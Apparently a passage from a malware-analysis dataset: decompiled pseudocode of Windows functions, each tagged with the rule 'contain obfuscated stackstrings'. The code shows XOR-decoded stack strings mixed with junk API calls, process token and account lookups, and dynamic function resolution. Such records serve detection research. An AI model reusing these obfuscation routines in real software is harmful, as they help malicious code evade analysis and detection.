var_2ch = &var_1ch - iVar13;\n    do {\n        iVar15 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar15 != 0xad6600) {\n            *(iVar14 + iVar13) = *(&var_28h + iVar14 % var_38h) ^ (iVar14 + iVar13)[&var_1ch - iVar13];\n        }\n        iVar14 = iVar14 + 1;\n    } while (iVar14 < 0x1a);\n    fcn.0040f262();\n    var_14h._0_1_ = 0x10;\n    var_14h._1_1_ = 0x56;\n    var_14h._2_1_ = 0x31;\n    var_14h._3_1_ = 0x5f;\n    var_10h._0_1_ = 0xc;\n    var_10h._1_1_ = 0x35;\n    var_10h._2_1_ = 0x20;\n    var_10h._3_1_ = 0x58;\n    var_ch._0_1_ = 0x34;\n    var_ch._1_1_ = 0x43;\n    var_ch._2_1_ = 1;\n    var_ch._3_1_ = 0x2c;\n    var_8h = 0x2a;\n    var_7h._0_1_ = 0x5f;\n    var_7h._1_1_ = 1;\n    var_7h._2_1_ = 0x56;\n    var_7h._3_1_ = 0xd;\n    var_3h._0_1_ = 0x5a;\n    var_28h = 0x31643343;\n    var_24h._0_2_ = 0x5a68;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n    iVar14 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar15 = 0;\n    var_2ch = &var_14h - iVar14;\n    do {\n        iVar16 = (*_sym.imp.USER32.dll_GetInputState)();\n        if (iVar16 != 0x5631a6) {\n            *(iVar15 + iVar14) = *(&var_28h + iVar15 % var_38h) ^ (iVar15 + iVar14)[&var_14h - iVar14];\n        }\n        iVar15 = iVar15 + 1;\n    } while (iVar15 < 0x12);\n    fcn.0040f262();\n    var_18h._0_1_ = 0x60;\n    var_18h._1_1_ = 0xf;\n    var_18h._2_1_ = 0x18;\n    var_18h._3_1_ = 0x2c;\n    var_14h._0_1_ = 9;\n    var_14h._1_1_ = 0x32;\n    var_14h._2_1_ = 0x72;\n    var_14h._3_1_ = 0xd;\n    var_10h._0_1_ = 0x2e;\n    var_10h._1_1_ = 0x3b;\n    var_10h._2_1_ = 0x13;\n    var_10h._3_1_ = 1;\n    var_ch._0_1_ = 0x41;\n    var_ch._1_1_ = 3;\n    var_ch._2_1_ = 0x3d;\n    var_ch._3_1_ = 0x3c;\n    var_8h = 0xb;\n    var_7h._0_1_ = 0x34;\n    var_7h._1_1_ = 0x54;\n    var_7h._2_1_ = 0xf;\n    var_7h._3_1_ = 0x4b;\n    var_28h = 0x554b6a33;\n    var_24h._0_2_ = 0x5167;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x16);\n    iVar15 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar16 = 0;\n    var_2ch = &var_18h - iVar15;\n    do {\n        iVar17 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        if (iVar17 != 0xdcf8cd) {\n            *(iVar16 + iVar15) = *(&var_28h + iVar16 % var_38h) ^ (iVar16 + iVar15)[&var_18h - iVar15];\n        }\n        iVar16 = iVar16 + 1;\n    } while (iVar16 < 0x15);\n    fcn.0040f262();\n    var_1ch = 0x730e19;\n    var_18h._0_1_ = 10;\n    var_18h._1_1_ = 0x2c;\n    var_18h._2_1_ = 0x26;\n    var_18h._3_1_ = 0xe;\n    var_14h._0_1_ = 0x72;\n    var_14h._1_1_ = 0xb;\n    var_14h._2_1_ = 7;\n    var_14h._3_1_ = 0x2b;\n    var_10h._0_1_ = 0x2d;\n    var_10h._1_1_ = 10;\n    var_10h._2_1_ = 0x42;\n    var_10h._3_1_ = 7;\n    var_ch._0_1_ = 4;\n    var_ch._1_1_ = 0x20;\n    var_ch._2_1_ = 0x1a;\n    var_ch._3_1_ = 0x19;\n    var_8h = 0x5f;\n    var_7h._0_1_ = 0x18;\n    var_7h._1_1_ = 2;\n    var_7h._2_1_ = 0x22;\n    var_7h._3_1_ = 0x2f;\n    var_3h._0_1_ = 0xc;\n    var_3h._1_1_ = 0x53;\n    var_3h._2_1_ = 0x6e;\n    var_28h = 0x6e366b4a;\n    var_24h._0_2_ = 0x4e6b;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1d);\n    iVar16 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar17 = 0;\n    var_2ch = &var_1ch - iVar16;\n    do {\n        iVar18 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar18 != 0x8690c5) {\n            *(iVar17 + iVar16) = *(&var_28h + iVar17 % var_38h) ^ (iVar17 + iVar16)[&var_1ch - iVar16];\n        }\n        iVar17 = iVar17 + 1;\n    } while (iVar17 < 0x1c);\n    fcn.0040f262();\n    var_18h._0_1_ = 0x6b;\n    var_18h._1_1_ = 0x2c;\n    var_18h._2_1_ = 0x28;\n    var_18h._3_1_ = 0x3b;\n    var_14h._0_1_ = 0x5f;\n    var_14h._1_1_ = 0x59;\n    var_14h._2_1_ = 0x2e;\n    var_14h._3_1_ = 0;\n    var_10h._0_1_ = 0xc;\n    var_10h._1_1_ = 0x5e;\n    var_10h._2_1_ = 0x54;\n    var_10h._3_1_ = 0x3c;\n    var_ch._0_1_ = 8;\n    var_ch._1_1_ = 0x3f;\n    var_ch._2_1_ = 0x61;\n    var_ch._3_1_ = 0x4a;\n    var_8h = 0x20;\n    var_7h._0_1_ = 0x13;\n    var_7h._1_1_ = 0x33;\n    var_7h._2_1_ = 0x5d;\n    var_7h._3_1_ = 0x5d;\n    var_3h._0_1_ = 0x2e;\n    var_3h._1_1_ = 0;\n    var_3h._2_1_ = 0x5a;\n    var_60h = 0x5a654938;\n    var_5ch._0_1_ = 0x31;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    iVar17 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar18 = 0;\n    var_2ch = &var_18h - iVar17;\n    do {\n        iVar19 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar19 != 0x516739) {\n            *(iVar18 + iVar17) = *(&var_60h + iVar18 % var_34h) ^ (iVar18 + iVar17)[&var_18h - iVar17];\n        }\n        iVar18 = iVar18 + 1;\n    } while (iVar18 < 0x18);\n    fcn.0040f262();\n    var_18h._0_1_ = 0x1f;\n    var_18h._1_1_ = 0x54;\n    var_18h._2_1_ = 0x7c;\n    var_18h._3_1_ = 0x3b;\n    var_14h._0_1_ = 0;\n    var_14h._1_1_ = 0x10;\n    var_14h._2_1_ = 0x3e;\n    var_14h._3_1_ = 0x42;\n    var_10h._0_1_ = 0x5a;\n    var_10h._1_1_ = 0x38;\n    var_10h._2_1_ = 0x11;\n    var_10h._3_1_ = 1;\n    var_ch._0_1_ = 0x29;\n    var_ch._1_1_ = 0x61;\n    var_ch._2_1_ = 0x47;\n    var_ch._3_1_ = 0x3f;\n    var_8h = 6;\n    var_7h._0_1_ = 0x1c;\n    var_7h._1_1_ = 0x20;\n    var_7h._2_1_ = 0x54;\n    var_7h._3_1_ = 0x52;\n    var_3h._0_1_ = 0x33;\n    var_3h._1_1_ = 0x70;\n    var_28h = 0x5635314c;\n    var_24h._0_2_ = 0x7570;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n    iVar18 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar19 = 0;\n    var_60h = iVar18;\n    var_2ch = &var_18h - iVar18;\n    do {\n        iVar20 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar20 != 0xdda504) {\n            *(iVar19 + iVar18) = *(&var_28h + iVar19 % var_38h) ^ (iVar19 + iVar18)[&var_18h - iVar18];\n        }\n        iVar19 = iVar19 + 1;\n    } while (iVar19 < 0x17);\n    fcn.0040f262();\n    var_18h._0_1_ = 6;\n    var_18h._1_1_ = 0x28;\n    var_18h._2_1_ = 0;\n    var_18h._3_1_ = 0x4a;\n    var_14h._0_1_ = 4;\n    var_14h._1_1_ = 0x34;\n    var_14h._2_1_ = 0x39;\n    var_14h._3_1_ = 0x26;\n    var_10h._0_1_ = 0x7f;\n    var_10h._1_1_ = 0xd;\n    var_10h._2_1_ = 0x3a;\n    var_10h._3_1_ = 0x2f;\n    var_ch._0_1_ = 0x22;\n    var_ch._1_1_ = 0x54;\n    var_ch._2_1_ = 0x31;\n    var_ch._3_1_ = 0x27;\n    var_8h = 0x24;\n    var_7h._0_1_ = 0x35;\n    var_7h._1_1_ = 0x51;\n    var_7h._2_1_ = 0xd;\n    var_7h._3_1_ = 0x30;\n    var_3h._0_1_ = 0x2a;\n    var_3h._1_1_ = 0x26;\n    var_3h._2_1_ = 0x38;\n    var_50h = 0x38434d55;\n    var_4ch._0_1_ = 0x61;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    iVar18 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar19 = 0;\n    var_2ch = &var_18h - iVar18;\n    do {\n        iVar20 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n        if (iVar20 != 0x6451ab) {\n            *(iVar19 + iVar18) = *(&var_50h + iVar19 % var_34h) ^ (iVar19 + iVar18)[&var_18h - iVar18];\n        }\n        iVar19 = iVar19 + 1;\n    } while (iVar19 < 0x18);\n    fcn.0040f262();\n    var_18h._0_1_ = 5;\n    var_20h = 0x1c353731;\n    var_1ch = 0x37161027;\n    var_18h._1_1_ = 0x2d;\n    var_18h._2_1_ = 0x20;\n    var_18h._3_1_ = 6;\n    var_14h._1_1_ = 0x1f;\n    var_14h._2_1_ = 0;\n    var_14h._3_1_ = 0;\n    var_10h._0_1_ = 0x13;\n    var_10h._1_1_ = 0;\n    var_10h._2_1_ = 1;\n    var_10h._3_1_ = 0x37;\n    var_ch._0_1_ = 0x12;\n    var_ch._1_1_ = 0x1d;\n    var_ch._2_1_ = 2;\n    var_ch._3_1_ = 0x11;\n    var_8h = 0xb;\n    var_7h._0_1_ = 0x24;\n    var_7h._1_1_ = 8;\n    var_7h._2_1_ = 2;\n    var_7h._3_1_ = 0x37;\n    var_3h._0_1_ = 4;\n    var_3h._1_1_ = 7;\n    var_3h._2_1_ = 0x52;\n    var_28h = 0x6e615262;\n    var_24h._0_2_ = 0x6352;\n    var_14h._0_1_ = var_18h._3_1_;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    iVar19 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar20 = 0;\n    var_50h = iVar19;\n    var_2ch = &var_20h - iVar19;\n    do {\n        iVar21 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n        if (iVar21 != 0xe6c6a0) {\n            *(iVar20 + iVar19) = *(&var_28h + iVar20 % var_38h) ^ (iVar20 + iVar19)[&var_20h - iVar19];\n        }\n        iVar20 = iVar20 + 1;\n    } while (iVar20 < 0x20);\n    fcn.0040f262();\n    var_14h._0_1_ = 0x3c;\n    var_14h._1_1_ = 0x24;\n    var_14h._2_1_ = 0x21;\n    var_14h._3_1_ = 0x3f;\n    var_10h._0_1_ = 0x24;\n    var_10h._1_1_ = 4;\n    var_10h._2_1_ = 0xd;\n    var_10h._3_1_ = 0x24;\n    var_ch._0_1_ = 0x1f;\n    var_ch._1_1_ = 10;\n    var_ch._2_1_ = 0x3a;\n    var_ch._3_1_ = 0xc;\n    var_8h = 0x19;\n    var_7h._0_1_ = 0x28;\n    var_7h._1_1_ = 0x1f;\n    var_7h._2_1_ = 0x3f;\n    var_7h._3_1_ = 0x2f;\n    var_3h._0_1_ = 0;\n    var_3h._1_1_ = 0x6f;\n    var_28h = 0x5a73416f;\n    var_24h._0_2_ = 0x6548;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar19 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar20 = 0;\n    var_2ch = &var_14h - iVar19;\n    do {\n        iVar21 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n        if (iVar21 != 0x6b6026) {\n            *(iVar20 + iVar19) = *(&var_28h + iVar20 % var_38h) ^ (iVar20 + iVar19)[&var_14h - iVar19];\n        }\n        iVar20 = iVar20 + 1;\n    } while (iVar20 < 0x13);\n    fcn.0040f262();\n    var_20h = 0x20223430;\n    var_1ch = 0xa34115a;\n    var_18h._0_1_ = 0x3d;\n    var_18h._1_1_ = 0x5c;\n    var_18h._2_1_ = 0x34;\n    var_18h._3_1_ = 0x3e;\n    var_14h._0_1_ = 0x19;\n    var_14h._1_1_ = 0x25;\n    var_14h._2_1_ = 0x50;\n    var_14h._3_1_ = 0xd;\n    var_10h._0_1_ = 0x36;\n    var_10h._1_1_ = 0x38;\n    var_10h._2_1_ = 0x2b;\n    var_10h._3_1_ = 0x4d;\n    var_ch._0_1_ = 0x33;\n    var_ch._1_1_ = 0x23;\n    var_ch._2_1_ = 2;\n    var_ch._3_1_ = 0x38;\n    var_8h = 0x50;\n    var_7h._0_1_ = 0xf;\n    var_7h._1_1_ = 0x34;\n    var_7h._2_1_ = 0xc;\n    var_7h._3_1_ = 0x2b;\n    var_3h._0_1_ = 0x39;\n    var_28h = 0x4e6b5163;\n    var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x39);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n    iVar20 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar21 = 0;\n    var_2ch = &var_20h - iVar20;\n    do {\n        iVar22 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n        if (iVar22 != 0x28a25c) {\n            *(iVar21 + iVar20) = *(&var_28h + iVar21 % var_34h) ^ (iVar21 + iVar20)[&var_20h - iVar20];\n        }\n        iVar21 = iVar21 + 1;\n    } while (iVar21 < 0x1e);\n    fcn.0040f262();\n    var_14h._0_1_ = 0x37;\n    var_14h._1_1_ = 0x10;\n    var_14h._2_1_ = 3;\n    var_14h._3_1_ = 0x25;\n    var_10h._0_1_ = 0x39;\n    var_10h._1_1_ = 2;\n    var_10h._2_1_ = 0x3e;\n    var_10h._3_1_ = 0x1a;\n    var_ch._0_1_ = 0x39;\n    var_ch._1_1_ = 0x29;\n    var_ch._2_1_ = 4;\n    var_ch._3_1_ = 0x15;\n    var_8h = 0xd;\n    var_7h._0_1_ = 3;\n    var_7h._1_1_ = 0x3e;\n    var_7h._2_1_ = 0x20;\n    var_7h._3_1_ = 0x31;\n    var_3h._0_1_ = 0;\n    var_3h._1_1_ = 1;\n    var_3h._2_1_ = 0x75;\n    var_28h = 0x4c577564;\n    var_24h._0_2_ = 0x6754;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar21 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar22 = 0;\n    var_34h = iVar21;\n    var_2ch = &var_14h - iVar21;\n    do {\n        iVar23 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        if (iVar23 != 0x195208) {\n            *(iVar22 + iVar21) = *(&var_28h + iVar22 % var_38h) ^ (iVar22 + iVar21)[&var_14h - iVar21];\n        }\n        iVar22 = iVar22 + 1;\n    } while (iVar22 < 0x14);\n    fcn.0040f262();\n    var_20h = 0x267a2063;\n    var_1ch = 0x20443620;\n    var_18h._0_1_ = 0x6a;\n    var_18h._1_1_ = 0x2d;\n    var_18h._2_1_ = 0x28;\n    var_18h._3_1_ = 0x35;\n    var_14h._0_1_ = 0x5f;\n    var_14h._1_1_ = 0x29;\n    var_14h._2_1_ = 0x50;\n    var_14h._3_1_ = 0x37;\n    var_10h._0_1_ = 9;\n    var_10h._1_1_ = 0x3e;\n    var_10h._2_1_ = 0x5e;\n    var_10h._3_1_ = 0x2e;\n    var_ch._0_1_ = 0x69;\n    var_ch._1_1_ = 0x26;\n    var_ch._2_1_ = 0x2c;\n    var_ch._3_1_ = 0x21;\n    var_8h = 0x59;\n    var_7h._0_1_ = 0x29;\n    var_7h._1_1_ = 0x5c;\n    var_7h._2_1_ = 0x33;\n    var_7h._3_1_ = 0x20;\n    var_3h._0_1_ = 0x57;\n    var_28h = 0x54394530;\n    var_24h._0_2_ = 0x5745;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n    iVar21 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar22 = 0;\n    var_2ch = &var_20h - iVar21;\n    do {\n        iVar23 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar23 != 0x6d1e4e) {\n            *(iVar22 + iVar21) = *(&var_28h + iVar22 % var_38h) ^ (iVar22 + iVar21)[&var_20h - iVar21];\n        }\n        iVar22 = iVar22 + 1;\n    } while (iVar22 < 0x1e);\n    fcn.0040f262();\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar21);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar2)(0, var_34h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar20);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar19);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_50h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar18);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_60h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar17);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar16);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar15);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar14);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar13);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_58h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_40h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar12);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_48h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_b0h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar11);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar10);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar9);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_68h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_70h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar8);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar7);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_78h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_80h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_88h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar6);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_90h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_98h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_a0h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar5);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_a8h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar24);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar4);\n    (*pcVar1)(uVar3);\n    return;\n}\n",
        "token_count": 20686
    },
    "0040786d": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040786d(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t hObject;\n    uint ARG_0;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint pSessionId;\n    uint *dwProcessId;\n    uchar *var_10h;\n    uchar *var_ch;\n    uint dwBytes;\n    int32_t TokenHandle;\n    \n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    TokenHandle = 0;\n    ARG_0 = param_2;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    pcVar7 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_24h = 0x104;\n    var_10h = puVar3;\n    uVar2 = (*pcVar6)(8, 0x208);\n    var_ch = (*pcVar7)(uVar2);\n    var_20h = 0x104;\n    var_1ch = 0;\n    dwBytes = 0;\n    pSessionId = 0;\n    uVar2 = 0;\n    if ((puVar3 != NULL) && (var_ch != NULL)) {\n        hObject = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, dwProcessId);\n        pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n        if (hObject != 0) {\n            for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            puVar3 = var_ch;\n            for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            iVar5 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(hObject, 0x20008, &TokenHandle);\n            if ((iVar5 != 0) || (TokenHandle == 0)) {\n                iVar5 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(dwProcessId, &pSessionId);\n                pcVar1 = _sym.imp.ADVAPI32.dll_GetTokenInformation;\n                if (iVar5 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 1, 0, 0, &dwBytes);\n                    iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    if (iVar5 == 0x7a) {\n                        uVar2 = (*pcVar6)(8, dwBytes);\n                        dwProcessId = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        if (dwProcessId != NULL) {\n                            iVar5 = (*pcVar1)(TokenHandle, 1, dwProcessId, dwBytes, &dwBytes);\n                            if (iVar5 != 0) {\n                                iVar5 = (*_sym.imp.ADVAPI32.dll_LookupAccountSidW)\n                                                  (0, *dwProcessId, var_10h, &var_24h, var_ch, &var_20h, &var_30h);\n                                if (iVar5 != 0) {\n                                    var_60h = 0x4b0c6e6b;\n                                    var_5ch = 0x6e6b6201;\n                                    var_58h = 0x621d4b00;\n                                    var_54h = 0x4b736e76;\n                                    var_50h = 0x6e64620e;\n                                    var_4ch = 0x62214b6c;\n                                    var_48h = 0x4b6c6e64;\n                                    var_44h = 0x6e646221;\n                                    var_40h = 0x62364b6c;\n                                    var_3ch._0_2_ = 0x6e38;\n                                    var_38h = 0x4b496e38;\n                                    var_34h._0_2_ = 0x6252;\n                                    uVar2 = (*pcVar6)(8, 0x4d);\n                                    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                                    iVar8 = 0;\n                                    do {\n                                        iVar4 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n                                        if (iVar4 != 0x1e99b8) {\n                                            var_1ch = 6;\n                                            *(iVar8 + iVar5) =\n                                                 *(&var_38h + iVar8 % 6) ^ (iVar8 + iVar5)[&var_60h - iVar5];\n                                        }\n                                        iVar8 = iVar8 + 1;\n                                    } while (iVar8 < 0x26);\n                                    (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, iVar5, var_ch, var_10h, pSessionId);\n                                    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                                    var_1ch = 1;\n                                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n                                    pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                                }\n                            }\n                            uVar2 = (*pcVar6)(0, dwProcessId);\n                            (*pcVar7)(uVar2);\n                        }\n                    }\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n            puVar3 = var_10h;\n        }\n        uVar2 = (*pcVar6)(0, var_ch);\n        (*pcVar7)(uVar2);\n        uVar2 = (*pcVar6)(0, puVar3);\n        (*pcVar7)(uVar2);\n        uVar2 = var_1ch;\n    }\n    return uVar2;\n}\n",
        "token_count": 1523
    },
    "004086d7": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar * __fastcall fcn.004086d7(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uchar *puVar7;\n    uint *puVar8;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uchar *ARG_0;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_54h = 0x37181674;\n    iVar6 = 8;\n    puVar8 = &var_2ch;\n    var_14h = param_2;\n    for (iVar5 = iVar6; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_50h = 0x16501d4b;\n    var_4ch = 0x1b6d141f;\n    puVar8 = &var_44h;\n    for (iVar5 = iVar6; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_48h = 0x671f165e;\n    var_1ch = 0x676c7333;\n    puVar8 = &var_3ch;\n    for (iVar5 = iVar6; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_18h._0_2_ = 0x7239;\n    puVar8 = &var_34h;\n    for (; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_4h = 6;\n    iVar6 = 0;\n    ARG_0 = &var_54h - iVar5;\n    var_8h = iVar5;\n    do {\n        iVar2 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar2 != 0xeafb94) {\n            *(iVar6 + iVar5) = *(&var_1ch + iVar6 % var_4h) ^ (iVar6 + iVar5)[ARG_0];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x10);\n    var_54h = 0x14202a1b;\n    var_50h = 0x7d433d36;\n    var_4ch = 0x3d3f1e7c;\n    var_48h = CONCAT31(var_48h._1_3_, 0x70);\n    var_24h = 0x7a524f70;\n    var_20h._0_2_ = 0x5153;\n    uVar1 = (*pcVar4)(8, 0xe);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar6 = 0;\n    var_1ch = iVar5;\n    ARG_0 = &var_54h - iVar5;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        iVar2 = var_8h;\n        if (iVar3 != 0x3e5189) {\n            *(iVar6 + iVar5) = *(&var_24h + iVar6 % var_4h) ^ (&var_54h - iVar5)[iVar6 + iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xd);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar5, var_8h);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    if (pcVar4 != NULL) {\n        iVar6 = (*pcVar4)(var_10h, &var_2ch, &var_44h, &var_3ch, &var_34h);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (iVar6 != 0) {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x104);\n            ARG_0 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            var_54h = 0x50692c7f;\n            var_50h = 0x65227748;\n            var_4ch = 0x37404561;\n            puVar7 = ARG_0;\n            for (iVar5 = 0x104; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            var_48h = CONCAT31(var_48h._1_3_, 0x5a);\n            var_24h = 0x7544485a;\n            var_20h._0_2_ = 0x4f78;\n            uVar1 = (*pcVar4)(8, 0xe);\n            iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar6 = 